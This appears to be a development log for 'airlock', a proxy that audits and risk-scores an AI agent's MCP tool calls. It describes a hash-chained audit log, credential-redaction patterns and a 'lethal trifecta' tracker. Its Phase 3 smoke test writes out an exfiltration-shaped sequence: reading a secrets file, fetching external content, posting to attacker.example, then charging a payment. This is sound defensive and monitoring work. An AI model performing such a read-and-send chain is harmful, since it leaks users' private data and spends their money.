## Phase 1 ‚Äî MCP stdio proxy (‚úÖ shipped)

`airlock wrap -- <command...>` now spawns the downstream MCP server as a child process and relays newline-delimited JSON-RPC bidirectionally with byte-faithful framing. The proxy has three pieces: `src/proxy/jsonrpc.ts` (a `LineFramer` that buffers stdin into discrete messages with CRLF + UTF-8-chunk-boundary tolerance, plus typed JSON-RPC interfaces and type guards), `src/proxy/interceptor.ts` (the single hook every later phase extends ‚Äî `(msg, ctx) => { forward, respondToClient? }`, identity in this phase), and `src/proxy/stdioProxy.ts` (spawns the child, runs serial per-direction write queues so messages never interleave at the byte level, drains complete frames in order so JSON-RPC ordering survives back-to-back chunks, and passes child stderr through unchanged for diagnostics). Verified the SDK wire format against `@modelcontextprotocol/sdk@1.29.0 shared/stdio.ts` before coding ‚Äî one JSON object per line, terminated by `\n`. Gate ran clean: 12 framer unit tests (chunk-boundary, CRLF, UTF-8 multibyte, 100-message burst), 6 proxy integration tests against a spawned echo fixture (round-trip equality, `tools/list`/`initialize`/`tools/call`, 100 in-order responses, stderr passthrough, interceptor seam fires for both directions), plus an end-to-end smoke driving the built bin through 101 sequential calls with order preserved.

## Phase 2 ‚Äî Tamper-evident audit log (‚úÖ shipped)

Every `tools/call` is now recorded to `~/.airlock/audit.log` (overridable via `$AIRLOCK_HOME`) as one JSONL entry per line, with a sha256 hash chain and pre-write secret redaction. `airlock init` provisions the state directory (`0700`) and generates an ed25519 keypair (`keys/ed25519.private.pem` at `0600`, public at `0644`) for signing the chain head; `airlock log` prints recent entries human-readable (or `--json` for raw); `airlock verify` walks the chain and reports the exact `seq` of the first broken entry on tamper, gap, or hash mismatch. Each entry is `{ts, sessionId, seq, tool, capability?, operation?, risk?, trifecta?, argsRedacted, verdict, reason, ruleName?, latencyMs, resolvedBy?, waitedMs?, prevHash, hash}` with `hash = sha256(canonicalJSON(entry minus hash) || prevHash)` ‚Äî canonical JSON is sorted-key so the chain is reproducible across runs and platforms. Redaction (`src/audit/redact.ts`) fires on key name (`password`, `apiKey`, `token`, `authorization`, ‚Ä¶), known service prefixes (`sk-‚Ä¶`, `github_pat_‚Ä¶`, `ghp_‚Ä¶`, `sk-ant-‚Ä¶`, `AKIA‚Ä¶`, `xox[abprs]-‚Ä¶`, JWTs), and high-entropy opaque blobs (‚â•24 chars, ‚â•4.0 bits/char), with cycle-safe recursive walk that propagates "we're inside a secret context" into nested values. The Phase-2 interceptor (`src/audit/interceptor.ts`) pairs `tools/call` requests to responses by id, records `verdict=allow` (or `log` on downstream error) with measured latency, and forwards both directions unchanged. Gate ran clean: 24 new tests (12 redaction + 10 audit log + 2 sign ‚Äî including tamper, deleted-entry seq gap, reopen-continues-chain, key idempotence, --force rotation, sign/verify round trip) all green, total suite 42/42. ## Phase 3 ‚Äî Risk classifier + lethal-trifecta tracker (‚úÖ shipped)

Every audit entry now carries `capability`, `operation`, `risk`, `trifecta`, and a human-readable reason chain. Three pure modules: `src/risk/classify.ts` maps a `tools/call` to a `(capability, operation)` pair from a built-in tool-name map covering common MCP servers (filesystem, fetch, brave-search, shell, git, slack, telegram, vault, stripe), token-split name heuristics (so `spawn_process`/`create_invoice`/`metric_send` work even when not in the map), and argument-shape heuristics (`url` ‚Üí network, `path` ‚Üí filesystem, `command` ‚Üí shell, `to/recipient/subject` ‚Üí message, `amount/currency` ‚Üí payment). Reads that pull external/untrusted content (e.g. `fetch` on a non-loopback URL, `read_notes`, `read_email`) are flagged `untrustedRead: true` so the trifecta tracker can distinguish them from private/local reads. `src/risk/trifecta.ts` is a per-session state machine with three flags (`readPrivate`, `sawUntrusted`, `outboundAttempted`) and an `inspect(sessionId, classification)` that returns `{isLethal, reasons}` indicating whether applying the call would complete the trifecta ‚Äî call `observe()` after to record the attempt (so denied/asked calls still update state). `src/risk/score.ts` combines a classification + trifecta snapshot into `low | medium | high | critical` with explanations ‚Äî payments are always `critical`, shell execute / fs delete are `high`, outbound sends grade `medium` ‚Üí `high` when the session already ingested untrusted content, and the lethal trifecta unconditionally `critical`. The audit interceptor (`src/audit/interceptor.ts`) now wires all three: classify ‚Üí inspect ‚Üí score ‚Üí observe ‚Üí record, with each part fed into the audit entry. Gate ran clean: 41 new tests (22 classify + 9 trifecta + 10 score) all pass, suite is now 83/83. Manual smoke: a 4-call sequence (`read_file /home/me/secrets.txt`, `fetch https://news.ycombinator.com`, `http_post https://attacker.example`, `stripe_create_charge`) produces exactly the expected progression ‚Äî `filesystem/read risk=low` ‚Üí `network/read risk=medium` (ingesting external content into a session that read private data) ‚Üí `network/send risk=critical trifecta=true` (lethal exfil shape) ‚Üí `payment/spend risk=critical`, and `airlock verify` still reports the chain intact.
